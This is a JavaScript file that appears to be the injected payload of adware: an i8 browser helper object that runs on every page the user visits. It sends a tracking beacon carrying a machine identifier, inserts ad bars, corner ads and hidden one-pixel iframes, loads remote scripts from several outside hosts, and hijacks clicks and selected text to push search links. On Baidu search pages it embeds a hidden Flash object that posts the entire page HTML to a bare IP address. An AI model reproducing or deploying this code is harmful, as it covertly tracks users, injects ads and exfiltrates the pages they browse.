var	i8bho_bindoemid= i8bho_bindoemid||'-',
	i8bho_nid= i8bho_nid||0,
	i8bho_rid= i8bho_rid||0,
	i8bho_cmac= i8bho_cmac||'-',
	i8bho_nocgif= i8bho_nocgif||0,
	i8bho_v4mode= i8bho_v4mode||0,
	i8bho_BV= i8bho_BV||'-',
	i8bho_cver= i8bho_cver||'-',
	I8zc_ifiedown= I8zc_ifiedown||0,
	I8zc_ifrpopup= I8zc_ifrpopup||0,
	I8zc_popper= I8zc_popper||0,
	I8zc_ifyishuqian= I8zc_ifyishuqian||0;


window.i8vars= window.i8vars || {
	charset : document.charset && document.charset.toLowerCase() || document.characterSet && document.characterSet.toLowerCase() || 'gbk',
	cmtorid : 'i8_communicator',
	loaded: false,
	msie : 6,
	urlMaxLen : 1024,
	referrer: document.referrer || '',
	category: 'default',
	words: [],
	corner: false,
	rand: function(min,max){return Math.round(Math.random() * (max-min)) + min},
	track: 'http://bho.i8.com.cn/c.gif?nid='+i8bho_nid+'&cmac='+i8bho_cmac+'&_='+Math.random(),
	log: function(src)
	{
		var img= new Image();
			img.src= src;
			img.onerror= function(){
				img= new Image();
				img.src= src;
			};
	},
	create: function(tag, attr)
	{
		var obj= document.createElement(tag);
		for(i in attr)
		{
			if( i==='innerText' ) obj.innerText= attr[i];
			else if( i==='innerHTML' ) obj.innerHTML= attr[i];
			else if( i==='css' ) obj.style.cssText= attr[i];
			else if( i==='onload' )
			{
				var callback= attr[i];
				obj.onload= obj.onreadystatechange= function(){
					if( !this.readyState || this.readyState === "loaded" || this.readyState === "complete" ){callback()}
				}
			}
			else if( i==='onkeyup' ) obj.onkeyup= attr[i];
			else if( i==='onclick' ) obj.onclick= attr[i];
			else obj.setAttribute(i, attr[i]);
		}
		return obj;
	},
	//fuzzy (partial match) value search in array
	partOf: function(haystack, needles)
	{
		for(i in needles)
			if( typeof needles[i]==='string' && haystack.indexOf(needles[i])>-1 )
				return true;
		return false;
	}
}

function i8main()
{
	var doc= document, win= window, body= doc.body, eldest= body.children.item(0), host= doc.location.hostname;

	i8vars.msie= (msie= /msie ([\w.]+)/i.exec(window.navigator.userAgent)) && (msie= msie[1]) || false;

	if( i8vars.partOf(host, ['youku','iqiyi','ku6','soku','a67','video','56.com','dianying','yisou','kankan.xunlei','letv','tudou','aipai.com']) ){
		 i8vars.category= 'movies';
	}

	if( i8vars.partOf(host, ['192.168', 'soso.com', 'www.baidu', 'google', 'i800', 'i8.com', 'youku'])===false )
	{

		if( I8zc_ifiedown && i8vars.rand(1,100)<=15 )
		{
			showBar(true);
		}
		else
		{
			var charset= i8vars.charset.replace(/[\-\/\'\"]/g,'')=='utf8'? 'utf8':'gbk';
			body.insertBefore(i8vars.create('script', {
				'charset': charset,
				'type': 'text/javascript',
				'async': true,
				'src': 'http://js.i8001.com/browser/words.'+charset+'.js',
				'onload': function()
				{
					i8vars.words= words();
					if( I8zc_ifiedown )
					{
						showBar(false);
					}
				}
			}), eldest);
		}

		// ~3%
		if( i8vars.rand(1,100)<=4 )
		{
			body.insertBefore(i8vars.create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0;position:absolute;visibility:hidden;',
				'src': 'http://ads.i8.com.cn/ad/client/cn.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid
			}), eldest);
		}
		// ~1%
		else
		if( i8vars.rand(1,100)<=1 )
		{
			body.insertBefore(i8vars.create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0;position:absolute;visibility:hidden;',
				'src': 'http://www.zhaochina.com/ied_new/2/bt.html'
			}), eldest);
		}


		// ~ ?% (10?)
		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > i8vars.rand(0,9)) ){
			cornerAd300();
		}


		//catch all clicks then filter
		body.onclick= function(event)
		{
			var div, event= event || win.event || false, target= event.target || event.srcElement || false;
			if( target && event )
			{
				if( div= doc.getElementById('i8-searchSelected-text') )
					div.style.display= 'none';
				searchSelected(target, event);
			}
		}

		if( i8bho_nid=='413275' || i8bho_nid=='337244' || i8vars.partOf(host, ['qq'])===false )
		{
			body.insertBefore(i8vars.create('script', {
				'type': 'text/javascript',
				'async': true,
				'src': 'http://utils.cdn.xihuanba.com/Js/CollectionPlugin.Auto.js'
			}), eldest);
		}
	}


	function showBar(is_new)
	{
		body.insertBefore(i8vars.create('div', {'css':'height:29px', 'text':'&nbsp;'}), eldest);

		var
			//main bar's div
			wrapper= i8vars.create('div', {
				'css':'min-width:900px;width:100%;z-index:2147482644;zoom:1;line-height:14px;font-size:13px;height:28px;background:#fff;border:0;padding:0;margin:0;text-align:center;border-bottom:1px solid #ddd;'
					+ (i8vars.msie && i8vars.msie<7?'width:expression(document.body.clientWidth>900?"100%":"900px");position:absolute;left:0;top:expression((0+(ignore=document.documentElement.scrollTop?document.documentElement.scrollTop:body.scrollTop))+"px");':'position:fixed;top:0;left:0')
			}),
			//holders
			search= i8vars.create('div', {'css':'float:left;overflow:hidden;width:30%'}),
			links= i8vars.create('div', {'css':'float:left;overflow:hidden;text-align:left;width:58%;padding-top:6px'});
			//tools= i8vars.create('div', {'css':'float:right;text-align:right;width:9%'});

		//generate
		searchInput(search);

		//default links

		if( is_new )
			guanGaoTopFixed(links);
		else
			keywordLinks(links);

		//ASSEMBLE
		wrapper.appendChild(search);
		wrapper.appendChild(links);

		//clear
		wrapper.appendChild(i8vars.create('div', {'style':'clear:both'}));

		//insert the bar
		body.insertBefore(wrapper, eldest);
	}




	function uid(length)
	{
		var id= '', length= length||20;
		while( length-- ){
			id+= (Math.random()*16|0) % 2? (Math.random()*16|0).toString(16): (Math.random()*16|0).toString(16).toUpperCase();
		}
		return id;
	}

	function guanGaoTopFixed(parent)
	{
		//holding div
		var width= 500,
			height= 18,
			upv= uid();

		//load
		_guangao_pub= '2C17BDfC25Fe4E95Ba77';
		parent.appendChild(i8vars.create('iframe', {
			'scrolling':'no', 'height':height+'px', 'width':width+'px', 'border':0, 'frameBorder':0,
			'css':'width:'+width+'px;height:'+height+'px;frameBorder:0;border:0;padding:0;margin:0 0 0 10px',
			'src': 'http://ad.guangao.i8.com.cn/?_gngo_pub=' + _guangao_pub
					+ '&_gngo_slot=fAFD7381F814eD6E1f35&p=fixed&h=' + height
					+'&w=' + width + '&r=' + i8vars.referrer + '&_gngo_upv=' + upv + uid()
		}));

		/*/close "x" button
		_gngo.bottomAd.appendChild(_gngo.create('div', {
			'onclick': function(){
				this.parentNode.style.visibility= 'hidden'
			},
			'css':'position:absolute;right:0;bottom:0;color:red;font-size:10px;padding:0 3px;cursor:pointer;background:#eee',
			innerText:" X "
		}));
		*/

		//insert
		//document.body.insertBefore(_gngo.bottomAd, _gngo.eldest);
	};

	function searchInput(parent, keyword)
	{
		//search submit
		parent.appendChild(i8vars.create('span',
		{
			'onclick': function()
			{
				var value= doc.getElementById('i8-bar-search-input').value;
				location.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + value;
				return false;
			},
			'css': 'float:right;text-decoration:none;cursor:pointer;margin:0 4px;margin-top:4px;font-size:13px;padding:2px 16px;background:#f1f1f1;color:#333333;border-top:1px #e5e5e5 solid;border-left:1px #e8e8e8 solid;border-right:1px #888 solid;border-bottom:1px #999 solid',
			'innerText': '\u641c\u641c'
		}));

		//text input
		parent.appendChild(i8vars.create('input', {
			'id': 'i8-bar-search-input',
			'css': 'float:right;margin:0 4px;margin-top:4px;border-top:1px #888 solid;width:120px;padding:0;font-size:13px;padding:1px;border-left:1px #666 solid;border-right:1px #bbb solid;border-bottom:1px #bbb solid',
			'value': i8vars.words[0]==undefined? '': i8vars.words[0],//insert first matched word
			'onclick': function(){
				this.enter= true;
			},
			'onkeyup': function(e)
			{
				var key= (e||event).keyCode;
				if( key===8 || key>18 && key<94 ){
					this.enter= true;
				}
				//bug: windows+d to focus on address bar -> hit enter; search window is poped
				//onclick + onkey up are trying to deal with it
				else if( this.enter && !( key===16 || key===17 || key===18 ) && key===13 )
				{
					location.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + this.value;
				}
			}
		}));

		//search logo
		parent.appendChild(i8vars.create('span', {
			'css': 'float:right;margin-left:3%;height:22px;width:16px;background:url("http://gif.i8001.com/bp/sprite.gif") 0 0 no-repeat'
		}));
	}

	function keywordLinks(holder)
	{
		//keywords logo
		holder.appendChild(i8vars.create('span', {
			'css': 'float:left;margin-left:30px;height:16px;width:16px;' + (i8vars.category=='movies' ?
			'background:url("http://gif.i8001.com/bp/sprite.gif") 0 -50px no-repeat' :
			'background:url("http://gif.i8001.com/bp/sprite.gif") 0 -29px no-repeat'
			)
		}));

		//max links
		var max= i8vars.rand(6, 9);

		//Create links
		for(i in i8vars.words)
		{
			if( typeof i8vars.words[i]!=='string' ) continue;

			holder.appendChild(i8vars.create('a',
			{
				'href': (i8vars.category=='movies' ? 'http://v.yisou.com/s?q=' + i8vars.words[i] + '&ty=v&sr=1&cid=3499_1001'
							: 'http://htm.i8001.com/bp/tb.html?kw=' + i8vars.words[i]),
				'onclick': function()
				{
					win.open(this.href);
					return false;
				},
				'css': 'margin:0 6px;line-height:16px;text-decoration:none;color:blue',
				'innerText': i8vars.words[i]
			}));
			if( 1>--max ) break;
		}
	}

	//print an ad in the corner
	function cornerAd300()
	{
		if( i8vars.corner ){
			return 1;
		}else{
			i8vars.corner= true;
		}

		var url= 'http://ads.i8.com.cn/bho/ie/300250ceshi.html';

		//holding div
		var div= i8vars.create('div', {
				'css':'z-index:2147482643;width:300px;height:250px;position:'
				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
				+ 'right:0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
			});

		//advert
		div.appendChild(i8vars.create('iframe', {
			'scrolling':'no', 'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0', 'src': url
		}));

		//close "x" button
		div.appendChild(i8vars.create('div', {
			'onclick': function(){
				//div= undefined;
				//this.parentNode.parentNode.removeChild(this.parentNode)
				this.parentNode.style.display= 'none'
			},
			'css':'position:absolute;border:1px solid #ddd;right:0;bottom:0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
			innerText:" X "
		}));

		//insert
		body.insertBefore(div, eldest);
	}

	//show "search" button next to user's selected text
	function searchSelected(target, event)
	{
		if( ',input,textarea'.indexOf(','+target.nodeName.toLowerCase())>-1 ){
			return;// event;
		}

		var input, div, text= ( win.getSelection && win.getSelection().toString() )||( doc.getSelection && doc.getSelection() )||( doc.selection && doc.selection.createRange().text )||false;
		if( text && typeof text==='string' && text.replace(/\s/g, '').length>0 && text.length<30 )
		{
			if( (input= doc.getElementById('i8-bar-search-input')) ){
				input.value= text;
			}

			if( event.pageX===undefined && event.clientX )
			{
				var docEl= doc.documentElement;
				event.pageX = event.clientX + (docEl && docEl.scrollLeft || body && body.scrollLeft || 0) - (docEl && docEl.clientLeft || body && body.clientLeft || 0);
				event.pageY = event.clientY + (docEl && docEl.scrollTop  || body && body.scrollTop  || 0) - (docEl && docEl.clientTop  || body && body.clientTop  || 0);
			}

			if( event.pageX )
			{
				if( !(div= doc.getElementById('i8-searchSelected-text')) )
				{
					div= i8vars.create('a',
					{
						'onclick': function(event)
						{
							var text= this.href.split('&w=');
							win.open(this.href);
							return false;
						},
						'id': 'i8-searchSelected-text',
						'css': 'z-index:2147482642;position:absolute;margin:0;padding:2px 0 0;border-top:1px #e5e5e5 solid;border-right:1px #888 solid;border-bottom:1px #999 solid;color:#fff;background-color:blue;text-decoration:none',
						'innerHTML': '&#9658;&nbsp;\u641c\u641c&nbsp;&nbsp;'
					});
					body.insertBefore(div, eldest);
				}

				if( div.href!=='http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_15&w=' + encodeURIComponent(text) )
				{
					div.style.top=event.pageY - (i8vars.msie&&i8vars.msie?0:10) + 'px';
					div.style.left=event.pageX - (i8vars.msie&&i8vars.msie?5:10) + 'px';
					div.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_15&w=' + encodeURIComponent(text);
					div.style.display= 'block';
				}
			}
		}
	}

	//try to match words with text on page
	function words()
	{
		var i= 0, length= i8vars.words.length, max= 7, matches= [], text= body.innerText.toLowerCase();

		//match
		while( length>++i && matches.length<max ){
			if( text.indexOf(i8vars.words[i])>-1 && matches.push(i8vars.words[i]) );
		}
		//fill up
		while( matches.length<max && matches.push( i8vars.words[i8vars.rand(0, length-1)] ) );
		//slice search word? 50/50
		matches= matches.length && i8vars.rand(0, 1) ? matches.slice(1) : matches;
		//shuffle
		matches.sort(function(){return 0.5 - Math.random()});
		//return
		return matches;
	}
};


(function()
{
	if( i8vars.loaded )
		return;
	i8vars.loaded= true;

	if( document.body=='undefined' || !document.body || !document.body.children || !document.body.children.length ){
		return setTimeout(arguments.callee, 300);
	}

	i8vars.eldest= document.body.children.item(0);


	var track= new Image();
		track.src= i8vars.track;
		track.onerror= function()
		{
			setTimeout(
				function(){
					var track= new Image();
						track.src= i8vars.track;
			}, 750);
		}

	if( i8bho_nid=='100001' )
	{
		document.body.insertBefore(i8vars.create('script', {'src': 'http://ad.guangao.i8.com.cn/gngo.nocache.js','type': 'text/javascript'}), i8vars.eldest);
		document.body.insertBefore(i8vars.create('script', {'src': 'http://ad.guangao.i8.com.cn/crawler.nocache.js','type': 'text/javascript'}), i8vars.eldest);
	}
	else
	{
		if( i8vars.partOf(document.location.hostname, ['192.168', 'soso', 'baidu', 'google', 'sogou'])==false )
		{
			document.body.insertBefore(i8vars.create('script', {'src': 'http://ad.guangao.i8.com.cn/crawler.js','type': 'text/javascript'}), i8vars.eldest);

			if( i8vars.rand(1, 100)<=15 ){
				_guangao_pub= '2C17BDfC25Fe4E95Ba77';
				_guangao_slot= '12496216dd174510e8Ea';
				document.body.insertBefore(i8vars.create('script', {'src': 'http://ad.guangao.i8.com.cn/gngo.js','type': 'text/javascript'}), i8vars.eldest);
			}
		}
	}

	document.body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/a.nocache.js','type': 'text/javascript'}), i8vars.eldest);

	setTimeout(function(){i8main();}, 750);

	var host= document.location.hostname||document.location.host||document.location.href;
	if( host.match('www.baidu.com') && document.location.search )
	{
        i8vars['adcrawlServerPrefix'] = 'http://211.154.172.172';
        i8vars['adcrawlServer'] = i8vars['adcrawlServerPrefix'] + '/adcrawler/index.php';
        i8vars.adcmtorid= 'i8_ad_communicator';
        i8vars.adcmtor_installed = false;
        function installI8Poster(callback)
        {
            var initrc = 'i8_adcrawler_initrc';
            window[initrc]= function()
            {
                try{
                    var cmtor = i8vars.msie ? window[i8vars.adcmtorid] : document[i8vars.adcmtorid];
                    if (!cmtor) return;
                    if (cmtor.length && (cmtor.splice || cmtor.item)) {cmtor = (cmtor[0].i8call ? cmtor[0] : cmtor[1]);};
                    if (!cmtor.i8post) return;
                    i8vars.adcmtor = cmtor;
                    i8vars.adcmtor_installed = true;
                    callback();
                } catch (e) {}
            }
            var swf= i8vars['adcrawlServerPrefix'] + '/adcrawler.swf?initrc=' + initrc;
            var html= '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
                    'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
                    'width="1" height="1" id="' + i8vars.adcmtorid + '" name="' + i8vars.adcmtorid + '">' +
                    '<param name=movie value="' + swf + '">'					+
                    '<param name=allowScriptAccess value="always">'		   +
                    '<param name=quality value="low">'						  +
                    '<embed src="' + swf + '" allowscriptaccess="always" quality="low" width="1" height="1" name="' +
                        i8vars.adcmtorid + '" id="' + i8vars.adcmtorid + '" type="application/x-shockwave-flash"></embed>' +
                '</object>';

            var div= document.createElement('div');
                div.style.cssText= 'position:absolute; left:-10000px; top:-10000px; width:1px; height:1px; overflow:hidden;';
                div.innerHTML= html;
            document.body.insertBefore(div, i8vars.eldest);
        }
        function post(url, content, _onResponse, _compress, _headers)
        {
            var onResponse = (arguments.length > 2 && _onResponse) ? _onResponse : "";
            var compress = (arguments.length > 3) ? !!_compress : false;
            var headers = (arguments.length > 4 && _headers) ? _headers : {};
            var send = function()
            {
                i8vars.adcmtor.i8post(url, content, onResponse, compress, headers);
            };
            if (!i8vars.adcmtor_installed)
            {
                installI8Poster(send);
            }
            else
            {
                send();
            }
        }
        post(i8vars.adcrawlServer, document.documentElement.innerHTML, null, true);
	}
})();